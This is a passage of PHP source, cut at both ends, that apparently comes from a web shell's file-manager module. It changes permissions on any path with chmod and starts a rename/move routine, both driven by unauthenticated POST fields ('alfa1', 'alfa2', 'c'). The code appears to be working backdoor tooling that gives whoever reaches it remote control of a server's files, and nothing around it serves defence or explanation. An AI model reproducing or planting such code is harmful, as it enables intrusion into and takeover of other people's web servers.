	if($action == "permission"){
		$perms = 0;
		$perm = $_POST["alfa2"];
		for($i=strlen($perm)-1;$i>=0;--$i){
			$perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
		}
		if(@chmod($_POST['alfa1'], $perms)){
			echo("done");
		}else{
			echo("no");
		}
		return;
	}
	if($action == "rename" || $action == "move"){
		$alfa1_decoded = $_POST['alfa1'];
		if($chdir_fals){
			$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
		}
		$_POST['alfa1'] = trim($_POST['alfa1']);
		$alfa1_escape = addslashes($_POST["alfa1"]);
